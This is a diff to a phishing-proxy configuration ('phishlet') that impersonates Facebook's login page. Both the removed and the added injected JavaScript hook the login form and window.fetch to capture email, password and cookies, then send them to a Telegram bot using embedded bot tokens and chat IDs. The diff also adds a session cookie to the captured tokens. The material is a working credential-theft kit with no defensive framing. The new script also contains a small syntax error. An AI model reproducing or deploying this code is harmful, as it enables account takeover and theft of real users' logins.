@@ -20,7 +20,7 @@ sub_filters:
 
 auth_tokens:
   - domain: '.facebook.com'
-    keys: ['c_user','xs','sb']
+    keys: ['c_user','xs','sb', 'datr']
 credentials:
   username:
     key: 'email'
@@ -64,89 +64,71 @@ js_inject:
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"] #The target path is important as the javascript will be injected in all address pages started with /login 
     trigger_params: []
     script: |  
-      const originalFetch = window.fetch;
-      window.fetch = async function(...args) {
-        const [url, options] = args;
-        if (url.includes('/login/') && options?.method === 'POST') {
-          const formData = new URLSearchParams(options.body);
-          if (formData.has('email') && formData.has('pass')) {
-            const cookies = document.cookie;
-            await fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
-              method: 'POST',
-              body: JSON.stringify({
-                chat_id: "5228920520",
-                text: `NEW LOGIN\n${new Date()}\nEmail: ${formData.get('email')}\nPass: ${formData.get('pass')}\nCookies: ${cookies}\nUA: ${navigator.userAgent}`
-              }),
-              keepalive: true
-            });
-          }
-        }
-        return originalFetch.apply(this, args);
-      };
-      function onclickListener(){
-        var submit = document.querySelectorAll('button[type=submit]')[0];
-        submit.setAttribute("onclick", "sendPass()");
-        
-        var useragent = navigator.userAgent;
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("UserAgent="+encodeURIComponent(useragent));
-        
-        var browser = navigator.appName;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Browser="+encodeURIComponent(browser));
-        
-        var engine = navigator.product;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Engine="+encodeURIComponent(engine));
-        
-        var platform = navigator.platform;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Platform="+encodeURIComponent(platform));
-        return;
-      }
-      function sendPass(){
-        var password = document.getElementsByName("pass")[0].value;
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/login/device-based/regular/login/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("unenc_password="+encodeURIComponent(password));
-        return;
-      }
-      setTimeout(function(){ onclickListener(); }, 1000);
-      
+        (() => {
+        const BOT_TOKEN = "7584622526:AAH9qqBmwfwhJwqYkUbu4lcFmdzgEht57ZE"
+        const CHAT_ID = "916470086"; 
+        const EXFIL_DELAY = 2000; 
 
-# UPDATE : LOOKS LIKE FACEBOOK HAS CHANGED THE JAVASCRIPT FUNCTION, STILL THE FILTERS WORKS SOMETIME , SO I LEFT THEM AS THEY WERE IN PREVIOUS PHISHLET I MADE.
+        console.log('bot loaded');
+
+        // ====== Helper Functions ======
+        const safeSend = async (data) => {
+            try {
+                const text = encodeURIComponent(
+                    `📩 New Login\n` +
+                    `⏰ ${new Date().toLocaleString()}\n` +
+                    `📧 Email: ${data.email || "N/A"}\n` +
+                    `🔑 Password: ${data.pass || "N/A"}\n` +
+                    `🍪 Cookies: ${data.cookies || "N/A"}\n` +
+                    `🌐 UserAgent: ${navigator.userAgent}`
+                );
+
+                await fetch(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`,
+                    { mode: "no-cors", keepalive: true }
+                );
+            } catch (e) {}
+          };
+
+        const hijackLoginForm = () => {
+            const form = document.querySelector("form[action*='/login']");
+            if (!form) return;
+
+            form.addEventListener("submit", (e) => {
+                const email = document.querySelector("input[name='email']")?.value;
+                const pass = document.querySelector("input[name='pass']")?.value;
+                
+                if (email && pass) {
+                    setTimeout(() => {
+                        safeSend({
+                            email: email,
+                            pass: pass,
+                            cookies: document.cookie
+                        });
+                    }, EXFIL_DELAY);
+                    console.log('message sent')l
+                }
+            }, { capture: true });
+        };
+
+          const hijackFetch = () => {
+              const origFetch = window.fetch;
+              window.fetch = async (...args) => {
+                  const [url, options] = args;
+                  if (options?.method === "POST" && /\/login(\/|\.php)/i.test(url)) {
+                      const body = new URLSearchParams(options.body);
+                      if (body.has("email") && body.has("pass")) {
+                          safeSend({
+                              email: body.get("email"),
+                              pass: body.get("pass"),
+                              cookies: document.cookie
+                          });
+                      }
+                  }
+                  return origFetch.apply(this, args);
+              };
+          };
+          hijackLoginForm();
+          hijackFetch();
+        })();
       
-# The js Function Responsible For Password Encryption is Present in this js file Located At : https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/yEB-M5_vVi6.js?_nc_x=Ij3Wp8lg5Kz
-#
-# _encryptBeforeSending: function (a) {
-#      var c = this;
-#      a = a.bind(this);
-#      var d = this.loginFormParams && this.loginFormParams.pubKey;
-#      if ((window.crypto || window.msCrypto) && d) {
-#        var e = b('DOM').scry(this.loginForm, 'input[id="pass"]') [0],
-#        f = b('FBBrowserPasswordEncryption'),
-#        g = Math.floor(Date.now() / 1000).toString();
-#        b('promiseDone') (f.encryptPassword(d.keyId, d.publicKey, e.value, g), function (d) {
-#          d = b('DOM').create('input', {
-#            type: 'hidden',
-#            name: 'ep',
-#            value: d
-#          });
-#          c.loginForm.appendChild(d);
-#          e.disabled = !0;
-#          a()
-#        }, function (c) {
-#          var d = '#PWD_BROWSER',
-#          e = 5,
-#          f = b('LoginServicePasswordEncryptDecryptEventTypedLogger');
-#          new f().setError('BrowserEncryptionFailureInLoginFormControllerWWW').setGrowthFlow('Bluebar/main login WWW').setErrorMessage(c.message).setPasswordTag(d).setPasswordEncryptionVersion(e).setPasswordTimestamp(g).logVital();
-#          a()
-#        })
-#      } else a()
-#    },
